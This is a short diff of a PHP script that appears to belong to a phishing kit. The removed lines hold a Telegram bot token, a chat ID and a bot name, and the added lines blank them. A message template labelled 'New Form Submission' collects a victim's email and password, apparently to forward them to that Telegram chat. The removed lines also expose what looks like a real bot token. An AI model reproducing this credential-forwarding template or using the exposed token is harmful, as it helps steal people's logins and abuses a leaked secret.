@@ -1,8 +1,8 @@
 <?php 
 
-$TOKEN = "7524805762:AAGOH4U8SIamAXpOAJBw0FzMbZuUTXaSg7g";
-$chatId = "7879058098"; 
-$userbots = "docbox2_bot";
+$TOKEN = "";
+$chatId = ""; 
+$userbots = "";
 
 define("TOKEN", $TOKEN);
 
@@ -66,7 +66,7 @@ $date = date("Y-m-d H:i:s");
 
 $text = "
 
-© <b>New Form Submission</b>
+Â© <b>New Form Submission</b>
 
 Email: $email
 Pass: $pass
